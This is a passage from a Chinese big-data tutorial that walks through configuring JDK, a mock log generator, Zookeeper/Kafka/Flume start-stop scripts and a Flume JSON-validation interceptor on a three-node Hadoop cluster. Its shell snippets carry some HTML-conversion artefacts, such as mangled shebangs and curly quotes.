/etc/profile.d/my_env.sh</p><p>添加如下内容，然后保存（:wq）退出</p><p>##JAVA_HOME</p><p>export JAVA_HOME=/opt/module/jdk1.8.0_212</p><p>export PATH=$PATH:$JAVA_HOME/bin</p><p>（2）让环境变量生效</p><p>[atguigu@hadoop102 software]$ source /etc/profile.d/my_env.sh</p><p><strong>（8）测试JDK是否安装成功</strong></p><p>[atguigu@hadoop102 module]## java -version</p><p>如果能看到以下结果、则Java正常安装</p><p>java version “1.8.0_212”</p><p><strong>（9）分发JDK</strong></p><p>[atguigu@hadoop102 module]$ xsync /opt/module/jdk1.8.0_212/</p><p><strong>（10）分发环境变量配置文件</strong></p><p>[atguigu@hadoop102 module]$ sudo /home/atguigu/bin/xsync<br>/etc/profile.d/my_env.sh</p><p><strong>（11）分别在hadoop103、hadoop104上执行source</strong></p><p>[atguigu@hadoop103 module]$ source /etc/profile.d/my_env.sh</p><p>[atguigu@hadoop104 module]$ source /etc/profile.d/my_env.sh</p><p><strong>3）环境变量配置说明</strong></p><p>Linux的环境变量可在多个文件中配置，如/etc/profile，/etc/profile.d/*.sh，~/.bashrc，~/.bash_profile等，下面说明上述几个文件之间的关系和区别。</p><p>bash的运行模式可分为login shell和non-login shell。</p><p>例如，我们通过终端，输入用户名、密码，登录系统之后，得到就是一个login<br>shell，而当我们执行以下命令ssh hadoop103<br>command，在hadoop103执行command的就是一个non-login shell。</p><p>这两种shell的主要区别在于，它们启动时会加载不同的配置文件，login<br>shell启动时会加载/etc/profile，~/.bash_profile，~/.bashrc，non-login<br>shell启动时会加载~/.bashrc。即login shell会多加载/etc/profile文件。</p><p>而在加载~/.bashrc（实际是~/.bashrc中加载的/etc/bashrc）或/etc/profile时，都会执行如下代码片段，</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/f33dbe2730179246e8ec1808a780b4bc.png"></p><p>因此不管是login shell还是non-login<br>shell，启动时都会加载/etc/profile.d/*.sh中的环境变量。而login<br>shell会多加载/etc/profile.d/sh.local文件。</p><h4 id="模拟数据"><a href="#模拟数据" class="headerlink" title="模拟数据"></a>模拟数据</h4><p><strong>1）模拟器使用说明</strong></p><p><strong>（1）上传模拟器</strong></p><p>将application.yml、gmall2020-mock-log-2021-10-10.jar、path.json、logback.xml上传到hadoop102的/opt/module/applog目录下</p><p><strong>创建applog路径</strong></p><p>[atguigu@hadoop102 module]$ mkdir /opt/module/applog</p><p><strong>上传文件</strong></p><p><strong>（2）配置文件说明</strong></p><p><strong>application.yml文件</strong></p><p>可以根据需求生成对应日期的用户行为日志。</p><p>[atguigu@hadoop102 applog]$ vim application.yml</p><p>修改如下内容</p><p>## 外部配置打开</p><p>logging.config: “./logback.xml”</p><p>##业务日期 即数据内的时间戳</p><p>mock.date: “2020-06-14”</p><p>##模拟数据发送模式</p><p>mock.type: “log”</p><p>##mock.type: “http”</p><p>##mock.type: “kafka”</p><p>##http模式下，发送的地址 没有使用</p><p>mock.url: “<a href="http://localhost:8090/applog&quot;">http://localhost:8090/applog&quot;</a></p><p>##kafka模式下，发送的地址 没有使用</p><p>mock:</p><p>kafka-server: “hdp1:9092,hdp2:9092,hdp3:9092”</p><p>kafka-topic: “ODS_BASE_LOG”</p><p>##启动次数</p><p>mock.startup.count: 200</p><p>##设备最大值</p><p>mock.max.mid: 1000000</p><p>##会员最大值</p><p>mock.max.uid: 1000</p><p>##商品最大值</p><p>mock.max.sku-id: 35</p><p>##页面平均访问时间</p><p>mock.page.during-time-ms: 20000</p><p>##错误概率 百分比</p><p>mock.error.rate: 3</p><p>##每条日志发送延迟 ms</p><p>mock.log.sleep: 20</p><p>##商品详情来源 用户查询，商品推广，智能推荐, 促销活动</p><p>mock.detail.source-type-rate: “40:25:15:20”</p><p>##领取购物券概率</p><p>mock.if_get_coupon_rate: 75</p><p>##购物券最大id</p><p>mock.max.coupon-id: 3</p><p>##搜索关键词</p><p>mock.search.keyword: “图书,小米,iphone11,电视,口红,ps5,苹果手机,小米盒子”</p><p>## 男女浏览商品比重（35sku)</p><p>mock.sku-weight.male:<br>“10:10:10:10:10:10:10:5:5:5:5:5:10:10:10:10:12:12:12:12:12:5:5:5:5:3:3:3:3:3:3:3:3:10:10”</p><p>mock.sku-weight.female:<br>“1:1:1:1:1:1:1:5:5:5:5:5:1:1:1:1:2:2:2:2:2:8:8:8:8:15:15:15:15:15:15:15:15:1:1”</p><p><strong>path.json</strong></p><p>该文件用来配置访问路径，可以根据需求，灵活配置用户访问路径。</p><p>[</p><p>{“path”:[“home”,”good_list”,”good_detail”,”cart”,”trade”,”payment”],”rate”:20 },</p><p>{“path”:[“home”,”search”,”good_list”,”good_detail”,”login”,”good_detail”,”cart”,”trade”,”payment”],”rate”:30<br>},</p><p>{“path”:[“home”,”search”,”good_list”,”good_detail”,”login”,”register”,”good_detail”,”cart”,”trade”,”payment”],”rate”:20<br>},</p><p>{“path”:[“home”,”mine”,”orders_unpaid”,”trade”,”payment”],”rate”:10 },</p><p>{“path”:[“home”,”mine”,”orders_unpaid”,”good_detail”,”good_spec”,”comment”,”trade”,”payment”],”rate”:5<br>},</p><p>{“path”:[“home”,”mine”,”orders_unpaid”,”good_detail”,”good_spec”,”comment”,”home”],”rate”:5<br>},</p><p>{“path”:[“home”,”good_detail”],”rate”:20 },</p><p>{“path”:[“home” ],”rate”:10 }</p><p>]</p><p><strong>logback配置文件</strong></p><p>可配置日志生成路径，修改内容如下</p><p>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</p><p>&lt;configuration&gt;</p><p>&lt;property name=”**LOG_HOME**” value=”**/opt/module/applog/log**” /&gt;</p><p>&lt;appender name=”console” class=”ch.qos.logback.core.ConsoleAppender”&gt;</p><p>&lt;encoder&gt;</p><p>&lt;pattern&gt;%msg%n&lt;/pattern&gt;</p><p>&lt;/encoder&gt;</p><p>&lt;/appender&gt;</p><p>&lt;appender name=”rollingFile”<br>class=”ch.qos.logback.core.rolling.RollingFileAppender”&gt;</p><p>&lt;rollingPolicy class=”ch.qos.logback.core.rolling.TimeBasedRollingPolicy”&gt;</p><p>&lt;fileNamePattern&gt;${LOG_HOME}/app.%d{yyyy-MM-dd}.log&lt;/fileNamePattern&gt;</p><p>&lt;/rollingPolicy&gt;</p><p>&lt;encoder&gt;</p><p>&lt;pattern&gt;%msg%n&lt;/pattern&gt;</p><p>&lt;/encoder&gt;</p><p>&lt;/appender&gt;</p><p>&lt;!– 将某一个包下日志单独打印日志 –&gt;</p><p>&lt;logger name=”com.atguigu.gmall2020.mock.log.util.LogUtil”</p><p>level=”INFO” additivity=”false”&gt;</p><p>&lt;appender-ref ref=”rollingFile” /&gt;</p><p>&lt;appender-ref ref=”console” /&gt;</p><p>&lt;/logger&gt;</p><p>&lt;root level=”error” &gt;</p><p>&lt;appender-ref ref=”console” /&gt;</p><p>&lt;!– &lt;appender-ref ref=”async-rollingFile” /&gt; –&gt;</p><p>&lt;/root&gt;</p><p>&lt;/configuration&gt;</p><p><strong>2）生成日志</strong></p><p>（1）进入到/opt/module/applog路径，执行以下命令</p><p>[atguigu@hadoop102 applog]$ java -jar gmall2020-mock-log-2021-10-10.jar</p><p>（2）在/opt/module/applog/log目录下查看生成日志</p><p>[atguigu@hadoop102 log]$ ll</p><p><strong>3）集群日志生成脚本</strong></p><p><strong>在hadoop102的/home/atguigu目录下创建bin目录，这样脚本可以在服务器的任何目录执行。</strong></p><p>[atguigu@hadoop102 ~]$ echo $PATH</p><p>/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/atguigu/.local/bin:/home/atguigu/bin</p><p><strong>（1）在/home/atguigu/bin目录下创建脚本lg.sh</strong></p><p>[atguigu@hadoop102 bin]$ vim lg.sh</p><p><strong>（2）在脚本中编写如下内容</strong></p><p>##!/bin/bash</p><p>for i in hadoop102 hadoop103; do</p><p>echo “========== $i ==========”</p><p>ssh $i “cd /opt/module/applog/; java -jar gmall2020-mock-log-2021-10-10.jar<br>&gt;/dev/null 2&gt;&amp;1 &amp;”</p><p>done</p><p>注：</p><p>/opt/module/applog/为jar包及配置文件所在路径</p><p>/dev/null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。</p><p>标准输入0：从键盘获得输入 /proc/self/fd/0</p><p>标准输出1：输出到屏幕（即控制台） /proc/self/fd/1</p><p>错误输出2：输出到屏幕（即控制台） /proc/self/fd/2</p><p><strong>（3）修改脚本执行权限</strong></p><p>[atguigu@hadoop102 bin]$ chmod u+x lg.sh</p><p><strong>（4）将jar包及配置文件上传至hadoop103的</strong>/opt/module/applog/<strong>路径</strong></p><p><strong>（5）启动脚本</strong></p><p>[atguigu@hadoop102 module]$ lg.sh</p><p><strong>（6）分别在hadoop102、hadoop103的/opt/module/applog/log目录上查看生成的数据</strong></p><p>[atguigu@hadoop102 logs]$ ls</p><p>app.2020-06-14.log</p><p>[atguigu@hadoop103 logs]$ ls</p><p>app.2020-06-14.log</p><h2 id="第4章-数据采集模块"><a href="#第4章-数据采集模块" class="headerlink" title="第4章 数据采集模块"></a>第4章 数据采集模块</h2><h3 id="数据通道"><a href="#数据通道" class="headerlink" title="数据通道"></a>数据通道</h3><h3 id="环境准备-1"><a href="#环境准备-1" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="集群所有进程查看脚本"><a href="#集群所有进程查看脚本" class="headerlink" title="集群所有进程查看脚本"></a>集群所有进程查看脚本</h4><p>1）在/home/atguigu/bin目录下创建脚本xcall.sh</p><p>[atguigu@hadoop102 bin]$ vim xcall.sh</p><p>2）在脚本中编写如下内容</p><p>##! /bin/bash</p><p>for i in hadoop102 hadoop103 hadoop104</p><p>do</p><p>echo ——— $i ———-</p><p>ssh $i “$*“</p><p>done</p><p>3）修改脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod 777 xcall.sh</p><p>4）启动脚本</p><p>[atguigu@hadoop102 bin]$ xcall.sh jps</p><p>如果只是查看集群进程启动情况，可以使用jpsall脚本</p><p>##! /bin/bash</p><p>for i in hadoop102 hadoop103 hadoop104</p><p>do</p><p>echo ——— $i ———-</p><p>ssh $i “jps $@ | grep -v Jps”</p><p>done</p><h4 id="Hadoop安装"><a href="#Hadoop安装" class="headerlink" title="Hadoop安装"></a>Hadoop安装</h4><p><strong>1）安装步骤</strong></p><p>详见：尚硅谷大数据技术之Hadoop（入门）</p><p><strong>2）项目经验</strong></p><p><strong>（1）项目经验之HDFS存储多目录</strong></p><p>生产环境服务器磁盘情况</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/abe21863ff846b4404d27ac0cda1460c.png"></p><p>在hdfs-site.xml文件中配置多目录，注意新挂载磁盘的访问权限问题。（本项目不需要配置多目录，如果配置启动hadoop会报错）</p><p>HDFS的DataNode节点保存数据的路径由dfs.datanode.data.dir参数决定，其默认值为file://${hadoop.tmp.dir}/dfs/data，若服务器有多个磁盘，必须对该参数进行修改。如服务器磁盘如上图所示，则该参数应修改为如下的值。</p><p>&lt;property&gt;</p><p>&lt;name&gt;dfs.datanode.data.dir&lt;/name&gt;</p><p>&lt;value&gt;file:///dfs/data1,file:///hd2/dfs/data2,file:///hd3/dfs/data3,file:///hd4/dfs/data4&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>注意：每台服务器挂载的磁盘不一样，所以每个节点的多目录配置可以不一致。单独配置即可。</p><p><strong>（2）项目经验之集群数据均衡</strong></p><p><strong>节点间数据均衡</strong></p><p>开启数据均衡命令：</p><p>start-balancer.sh -threshold 10</p><p>对于参数10，代表的是集群中各个节点的磁盘空间利用率相差不超过10%，可根据实际情况进行调整。</p><p>停止数据均衡命令：</p><p>stop-balancer.sh</p><p><strong>磁盘间数据均衡</strong></p><p>生成均衡计划<strong>（我们只有一块磁盘，不会生成计划）</strong></p><p>hdfs diskbalancer -plan hadoop103</p><p>执行均衡计划</p><p>hdfs diskbalancer -execute hadoop103.plan.json</p><p>查看当前均衡任务的执行情况</p><p>hdfs diskbalancer -query hadoop103</p><p>取消均衡任务</p><p>hdfs diskbalancer -cancel hadoop103.plan.json</p><p><strong>（3）项目经验之Hadoop参数调优</strong></p><p>HDFS参数调优hdfs-site.xml</p><p>The number of Namenode RPC server threads that listen to requests from clients.<br>If dfs.namenode.servicerpc-address is not configured then Namenode RPC server<br>threads listen to requests from all nodes.</p><p>NameNode有一个工作线程池，用来处理不同DataNode的并发心跳以及客户端并发的元数据操作。</p><p>对于大集群或者有大量客户端的集群来说，通常需要增大参数dfs.namenode.handler.count的默认值10。</p><p>&lt;property&gt;</p><p>&lt;name&gt;dfs.namenode.handler.count&lt;/name&gt;</p><p>&lt;value&gt;10&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>dfs.namenode.handler.count=，比如集群规模为8台时，此参数设置为41。可通过简单的python代码计算该值，代码如下。</p><p>[atguigu@hadoop102 ~]$ python</p><p>Python 2.7.5 (default, Apr 11 2018, 07:36:10)</p><p>[GCC 4.8.5 20150623 (Red Hat 4.8.5-28)] on linux2</p><p>Type “help”, “copyright”, “credits” or “license” for more information.</p><p>&gt;&gt;&gt; import math</p><p>&gt;&gt;&gt; print int(20*math.log(8))</p><p>41</p><p>&gt;&gt;&gt; quit()</p><p>YARN参数调优yarn-site.xml</p><p><strong>情景描述</strong>：总共7台机器，每天几亿条数据，数据源-&gt;Flume-&gt;Kafka-&gt;HDFS-&gt;Hive</p><p><strong>面临问题</strong>：数据统计主要用HiveSQL，没有数据倾斜，小文件已经做了合并处理，开启的JVM重用，而且IO没有阻塞，内存用了不到50%。但是还是跑的非常慢，而且数据量洪峰过来时，整个集群都会宕掉。基于这种情况有没有优化方案。</p><p><strong>解决办法，修改yarn关键参数：</strong></p><p>内存利用率不够。这个一般是Yarn的2个配置造成的，单个任务可以申请的最大内存大小，和Hadoop单个节点可用内存大小。调节这两个参数能提高系统内存的利用率。</p><p>（a）yarn.nodemanager.resource.memory-mb</p><p>表示该节点上YARN可使用的物理内存总量，默认是8192（MB），注意，如果你的节点内存资源不够8GB，则需要调减小这个值，而YARN不会智能的探测节点的物理内存总量。</p><p>（b）yarn.scheduler.maximum-allocation-mb</p><p>单个任务可申请的最多物理内存量，默认是8192（MB）。</p><h4 id="Zookeeper安装"><a href="#Zookeeper安装" class="headerlink" title="Zookeeper安装"></a>Zookeeper安装</h4><p><strong>1）安装步骤</strong></p><p>详见：尚硅谷大数据技术之Zookeeper</p><p><strong>2）ZK集群启动停止脚本</strong></p><p>（1）在hadoop102的/home/atguigu/bin目录下创建脚本</p><p>[atguigu@hadoop102 bin]$ vim zk.sh</p><p>在脚本中编写如下内容</p><p>##!/bin/bash</p><p>case $1 in</p><p>“start”){</p><p>for i in hadoop102 hadoop103 hadoop104</p><p>do</p><p>echo ———- zookeeper $i 启动 ————</p><p>ssh $i “/opt/module/zookeeper-3.5.7/bin/zkServer.sh start”</p><p>done</p><p>};;</p><p>“stop”){</p><p>for i in hadoop102 hadoop103 hadoop104</p><p>do</p><p>echo ———- zookeeper $i 停止 ————</p><p>ssh $i “/opt/module/zookeeper-3.5.7/bin/zkServer.sh stop”</p><p>done</p><p>};;</p><p>“status”){</p><p>for i in hadoop102 hadoop103 hadoop104</p><p>do</p><p>echo ———- zookeeper $i 状态 ————</p><p>ssh $i “/opt/module/zookeeper-3.5.7/bin/zkServer.sh status”</p><p>done</p><p>};;</p><p>esac</p><p>（2）增加脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod u+x zk.sh</p><p>（3）Zookeeper集群启动脚本</p><p>[atguigu@hadoop102 module]$ zk.sh start</p><p>（4）Zookeeper集群停止脚本</p><p>[atguigu@hadoop102 module]$ zk.sh stop</p><h4 id="Kafka安装"><a href="#Kafka安装" class="headerlink" title="Kafka安装"></a>Kafka安装</h4><p><strong>1）安装步骤</strong></p><p>详见：尚硅谷大数据技术之Kafka</p><p><strong>2）Kafka集群启动停止脚本</strong></p><p>（1）在/home/atguigu/bin目录下创建脚本kf.sh</p><p>[atguigu@hadoop102 bin]$ vim kf.sh</p><p>在脚本中填写如下内容</p><p>##! /bin/bash</p><p>case $1 in</p><p>“start”){</p><p>for i in hadoop102 hadoop103 hadoop104</p><p>do</p><p>echo “ ——–启动 $i Kafka——-“</p><p>ssh $i “/opt/module/kafka/bin/kafka-server-start.sh -daemon<br>/opt/module/kafka/config/server.properties”</p><p>done</p><p>};;</p><p>“stop”){</p><p>for i in hadoop102 hadoop103 hadoop104</p><p>do</p><p>echo “ ——–停止 $i Kafka——-“</p><p>ssh $i “/opt/module/kafka/bin/kafka-server-stop.sh stop”</p><p>done</p><p>};;</p><p>esac</p><p>（2）增加脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod u+x kf.sh</p><p>（3）kf集群启动脚本</p><p>[atguigu@hadoop102 module]$ kf.sh start</p><p>（4）kf集群停止脚本</p><p>[atguigu@hadoop102 module]$ kf.sh stop</p><p><strong>3）Kafka常用命令</strong></p><p><strong>（1）查看Kafka Topic列表</strong></p><p>[atguigu@hadoop102 kafka]$ bin/kafka-topics.sh –zookeeper hadoop102:2181/kafka<br>--list</p><p><strong>（2）创建Kafka Topic</strong></p><p>进入到/opt/module/kafka/目录下创建日志主题</p><p>[atguigu@hadoop102 kafka]$ bin/kafka-topics.sh –bootstrap-server<br>hadoop102:9092 –create –replication-factor 2 –partitions 3 –topic topic_log</p><p><strong>（3）删除Kafka Topic</strong></p><p>[atguigu@hadoop102 kafka]$ bin/kafka-topics.sh –delete –bootstrap-server<br>hadoop102:9092 –topic topic_log</p><p><strong>（4）Kafka生产消息</strong></p><p>[atguigu@hadoop102 kafka]$ bin/kafka-console-producer.sh \</p><p>--broker-list hadoop102:9092 –topic topic_log</p><p>&gt;hello world</p><p>&gt;atguigu atguigu</p><p><strong>（5）Kafka消费消息</strong></p><p>[atguigu@hadoop102 kafka]$ bin/kafka-console-consumer.sh \</p><p>--bootstrap-server hadoop102:9092 –from-beginning –topic topic_log</p><p>--from-beginning：会把主题中以往所有的数据都读取出来。根据业务场景选择是否增加该配置。</p><p><strong>（6）查看Kafka Topic详情</strong></p><p>[atguigu@hadoop102 kafka]$ bin/kafka-topics.sh –zookeeper hadoop102:2181/kafka<br>\</p><p>--describe –topic topic_log</p><h4 id="Flume安装"><a href="#Flume安装" class="headerlink" title="Flume安装"></a>Flume安装</h4><p>按照采集通道规划，需在hadoop102，hadoop103，hadoop104三台节点分别部署一个Flume。<strong>可参照以下步骤先在hadoop102安装，然后再进行分发。</strong></p><p><strong>1）安装步骤</strong></p><p>详见：尚硅谷大数据技术之Flume</p><p><strong>2）分发Flume</strong></p><p>[atguigu@hadoop102 ~]$ xsync /opt/module/flume/</p><p><strong>3）项目经验</strong></p><p><strong>（1）堆内存调整</strong></p><p>Flume堆内存通常设置为4G或更高，配置方式如下：</p><p>修改/opt/module/flume/conf/flume-env.sh文件，配置如下参数<strong>（虚拟机环境暂不配置，千万别配）</strong></p><p>export JAVA_OPTS=”-Xms4096m -Xmx4096m -Dcom.sun.management.jmxremote”</p><p>注：</p><p>-Xms表示JVM Heap(堆内存)最小尺寸，初始分配；</p><p>-Xmx 表示JVM Heap(堆内存)最大允许的尺寸，按需分配。</p><h3 id="日志采集Flume"><a href="#日志采集Flume" class="headerlink" title="日志采集Flume"></a>日志采集Flume</h3><h4 id="日志采集Flume配置概述"><a href="#日志采集Flume配置概述" class="headerlink" title="日志采集Flume配置概述"></a>日志采集Flume配置概述</h4><p>按照规划，需要采集的用户行为日志文件分布在hadoop102，hadoop103两台日志服务器，故需要在hadoop102，hadoop103两台节点配置日志采集Flume。日志采集Flume需要采集日志文件内容，并对日志格式（JSON）进行校验，然后将校验通过的日志发送到Kafka。</p><p>此处可选择TaildirSource和KafkaChannel，并配置日志校验拦截器。</p><p>选择TailDirSource和KafkaChannel的原因如下：</p><p><strong>1）TailDirSource</strong></p><p>TailDirSource相比ExecSource、SpoolingDirectorySource的优势</p><p>TailDirSource：断点续传、多目录。Flume1.6以前需要自己自定义Source记录每次读取文件位置，实现断点续传。</p><p>ExecSource可以实时搜集数据，但是在Flume不运行或者Shell命令出错的情况下，数据将会丢失。</p><p>SpoolingDirectorySource监控目录，支持断点续传。</p><p><strong>2）KafkaChannel</strong></p><p>采用Kafka Channel，省去了Sink，提高了效率。</p><p>日志采集Flume关键配置如下：</p><h4 id="日志采集Flume配置实操"><a href="#日志采集Flume配置实操" class="headerlink" title="日志采集Flume配置实操"></a>日志采集Flume配置实操</h4><p><strong>1）创建Flume配置文件</strong></p><p>在hadoop102节点的Flume的job目录下创建file_to_kafka.conf</p><p>[atguigu@hadoop104 flume]$ mkdir job</p><p>[atguigu@hadoop104 flume]$ vim job/file_to_kafka.conf</p><p><strong>2）配置文件内容如下</strong></p><p>##为各组件命名</p><p>a1.sources = r1</p><p>a1.channels = c1</p><p>##描述source</p><p>a1.sources.r1.type = TAILDIR</p><p>a1.sources.r1.filegroups = f1</p><p>a1.sources.r1.filegroups.f1 = /opt/module/applog/log/app.*</p><p>a1.sources.r1.positionFile = /opt/module/flume/taildir_position.json</p><p>a1.sources.r1.interceptors = i1</p><p>a1.sources.r1.interceptors.i1.type =<br>com.atguigu.flume.interceptor.ETLInterceptor$Builder</p><p>##描述channel</p><p>a1.channels.c1.type = org.apache.flume.channel.kafka.KafkaChannel</p><p>a1.channels.c1.kafka.bootstrap.servers = hadoop102:9092,hadoop103:9092</p><p>a1.channels.c1.kafka.topic = topic_log</p><p>a1.channels.c1.parseAsFlumeEvent = false</p><p>##绑定source和channel以及sink和channel的关系</p><p>a1.sources.r1.channels = c1</p><p><strong>3）编写Flume拦截器</strong></p><p>（1）创建Maven工程flume-interceptor</p><p>（2）创建包：com.atguigu.flume.interceptor</p><p>（3）在pom.xml文件中添加如下配置</p><p>&lt;dependencies&gt;<br>&lt;dependency&gt;<br>&lt;groupId&gt;org.apache.flume&lt;/groupId&gt;<br>&lt;artifactId&gt;flume-ng-core&lt;/artifactId&gt;<br>&lt;version&gt;1.9.0&lt;/version&gt;<br>&lt;scope&gt;provided&lt;/scope&gt;<br>&lt;/dependency&gt;  </p><p>&lt;dependency&gt;<br>&lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>&lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>&lt;version&gt;1.2.62&lt;/version&gt;<br>&lt;/dependency&gt;<br>&lt;/dependencies&gt;  </p><p>&lt;build&gt;<br>&lt;plugins&gt;<br>&lt;plugin&gt;<br>&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;<br>&lt;version&gt;2.3.2&lt;/version&gt;<br>&lt;configuration&gt;<br>&lt;source&gt;1.8&lt;/source&gt;<br>&lt;target&gt;1.8&lt;/target&gt;<br>&lt;/configuration&gt;<br>&lt;/plugin&gt;<br>&lt;plugin&gt;<br>&lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;<br>&lt;configuration&gt;<br>&lt;descriptorRefs&gt;<br>&lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;<br>&lt;/descriptorRefs&gt;<br>&lt;/configuration&gt;<br>&lt;executions&gt;<br>&lt;execution&gt;<br>&lt;id&gt;make-assembly&lt;/id&gt;<br>&lt;phase&gt;package&lt;/phase&gt;<br>&lt;goals&gt;<br>&lt;goal&gt;single&lt;/goal&gt;<br>&lt;/goals&gt;<br>&lt;/execution&gt;<br>&lt;/executions&gt;<br>&lt;/plugin&gt;<br>&lt;/plugins&gt;<br>&lt;/build&gt;</p><p>（4）在com.atguigu.flume.interceptor包下创建JSONUtils类</p><p>package com.atguigu.flume.interceptor;  </p><p>import com.alibaba.fastjson.JSON;<br>import com.alibaba.fastjson.JSONException;  </p><p>public class JSONUtils {<br>public static boolean isJSONValidate(String log){<br>try {<br>JSON.parse(log);<br>return true;<br>}catch (JSONException e){<br>return false;<br>}<br>}<br>}</p><p>（5）在com.atguigu.flume.interceptor包下创建LogInterceptor类</p><p>package com.atguigu.flume.interceptor;</p><p>import com.alibaba.fastjson.JSON;</p><p>import org.apache.flume.Context;</p><p>import org.apache.flume.Event;</p><p>import org.apache.flume.interceptor.Interceptor;</p><p>import java.nio.charset.StandardCharsets;</p><p>import java.util.Iterator;</p><p>import java.util.List;</p><p>public class ETLInterceptor implements Interceptor {</p><p>@Override</p><p>public void initialize() {</p><p>}</p><p>@Override</p><p>public Event intercept(Event event) {</p><p>byte[] body = event.getBody();</p><p>String log = new String(body, StandardCharsets.UTF_8);</p><p>if (JSONUtils.isJSONValidate(log)) {</p><p>return event;</p><p>} else {</p><p>return null;</p><p>}</p><p>}</p><p>@Override</p><p>public List&lt;Event&gt; intercept(List&lt;Event&gt; list) {</p><p>Iterator&lt;Event&gt; iterator = list.iterator();</p><p>while (iterator.hasNext()){</p><p>Event next = iterator.next();</p><p>if(intercept(next)==null){</p><p>iterator.remove();</p><p>}</p><p>}</p><p>return list;</p><p>}</p><p>public static class Builder implements Interceptor.Builder{</p><p>@Override</p><p>public Interceptor build() {</p><p>return new ETLInterceptor();</p><p>}</p><p>@Override</p><p>public void configure(Context context) {</p><p>}</p><p>}</p><p>@Override</p><p>public void close() {</p><p>}</p><p>}</p><p>（6）打包</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/361c38002f9891ce01e4771948d70b01.png" alt="图片包含 图形用户界面描述已自动生成"></p><p>（7）需要先将打好的包放入到hadoop102的/opt/module/flume/lib文件夹下面。</p><h4 id="日志采集Flume测试"><a href="#日志采集Flume测试" class="headerlink" title="日志采集Flume测试"></a>日志采集Flume测试</h4><p><strong>1）启动Zookeeper、Kafka集群</strong></p><p><strong>2）启动hadoop102的日志采集Flume</strong></p><p>[atguigu@hadoop102 flume]$ bin/flume-ng agent -n a1 -c conf/ -f<br>job/file_to_kafka.conf -Dflume.root.logger=info,console</p><p><strong>3）启动一个Kafka的Console-Consumer</strong></p><p>[atguigu@hadoop102 kafka]$ bin/kafka-console-consumer.sh –bootstrap-server<br>hadoop102:9092 –topic topic_log</p><p><strong>4）生成模拟数据</strong></p><p>[atguigu@hadoop102 ~]$ lg.sh</p><p><strong>5）观察Kafka消费者是否能消费到数据</strong></p><h4 id="日志采集Flume启停脚本"><a href="#日志采集Flume启停脚本" class="headerlink" title="日志采集Flume启停脚本"></a>日志采集Flume启停脚本</h4><p><strong>1）分发日志采集Flume配置文件和拦截器</strong></p><p>若上述测试通过，需将hadoop102节点的Flume的配置文件和拦截器jar包，向另一台日志服务器发送一份。</p><p>[atguigu@hadoop102 flume]$ scp -r job hadoop103:/opt/module/flume/</p><p>[atguigu@hadoop102 flume]$ scp<br>lib/flume-interceptor-1.0-SNAPSHOT-jar-with-dependencies.jar<br>hadoop103:/opt/module/flume/lib/</p><p><strong>2）方便起见，此处编写一个日志采集Flume进程的启停脚本</strong></p><p><strong>1）在hadoop102节点的/home/atguigu/bin目录下创建脚本f1.sh</strong></p><p>[atguigu@hadoop102 bin]$ vim f1.sh</p><p>在脚本中填写如下内容</p><p>##!/bin/bash</p><p>case $1 in</p><p>“start”){</p><p>for i in hadoop102 hadoop103</p><p>do</p><p>echo “ ——–启动 $i 采集flume——-“</p><p>ssh $i “nohup /opt/module/flume/bin/flume-ng agent -n a1 -c<br>/opt/module/flume/conf/ -f /opt/module/flume/job/file_to_kafka.conf &gt;/dev/null<br>2&gt;&amp;1 &amp;”</p><p>done</p><p>};;</p><p>“stop”){</p><p>for i in hadoop102 hadoop103</p><p>do</p><p>echo “ ——–停止 $i 采集flume——-“</p><p>ssh $i “ps -ef | grep file_to_kafka.conf | grep -v grep |awk ‘{print \$2}’<br>| xargs -n1 kill -9 “</p><p>done</p><p>};;</p><p>esac</p><p><strong>2）增加脚本执行权限</strong></p><p>[atguigu@hadoop102 bin]$ chmod x f1.sh</p><p><strong>3）f1启动</strong></p><p>[atguigu@hadoop102 module]$ f1.sh start</p><p><strong>4）f2停止</strong></p><p>[atguigu@hadoop102 module]$ f1.sh stop</p><h3 id="日志消费Flume"><a href="#日志消费Flume" class="headerlink" title="日志消费Flume"></a>日志消费Flume</h3><h4 id="日志消费Flume配置概述"><a href="#日志消费Flume配置概述" class="headerlink" title="日志消费Flume配置概述"></a>日志消费Flume配置概述</h4><p>按照规划，该Flume需将Kafka中topic_log的数据发往HDFS。并且对每天产生的用户行为日志进行区分，将不同天的数据发往HDFS不同天的路径。</p><p>此处选择KafkaSource、FileChannel、HDFSSink。</p><p>关键配置如下：</p><h4 id="日志消费Flume配置实操"><a href="#日志消费Flume配置实操" class="headerlink" title="日志消费Flume配置实操"></a>日志消费Flume配置实操</h4><p><strong>1）创建Flume配置文件</strong></p><p>在hadoop104节点的Flume的job目录下创建kafka_to_hdfs.conf</p><p>[atguigu@hadoop104 flume]$ mkdir job</p><p>[atguigu@hadoop104 flume]$ vim job/kafka_to_hdfs.conf</p><p><strong>2）配置文件内容如下</strong></p><p>#### 组件</p><p>a1.sources=r1</p><p>a1.channels=c1</p><p>a1.sinks=k1</p><p>#### source1</p><p>a1.sources.r1.type = org.apache.flume.source.kafka.KafkaSource</p><p>a1.sources.r1.batchSize = 5000</p><p>a1.sources.r1.batchDurationMillis = 2000</p><p>a1.sources.r1.kafka.bootstrap.servers =<br>hadoop102:9092,hadoop103:9092,hadoop104:9092</p><p>a1.sources.r1.kafka.topics=topic_log</p><p>a1.sources.r1.interceptors = i1</p><p>a1.sources.r1.interceptors.i1.type =<br>com.atguigu.flume.interceptor.TimestampInterceptor$Builder</p><p>#### channel1</p><p>a1.channels.c1.type = file</p><p>a1.channels.c1.checkpointDir = /opt/module/flume/checkpoint/behavior1</p><p>a1.channels.c1.dataDirs = 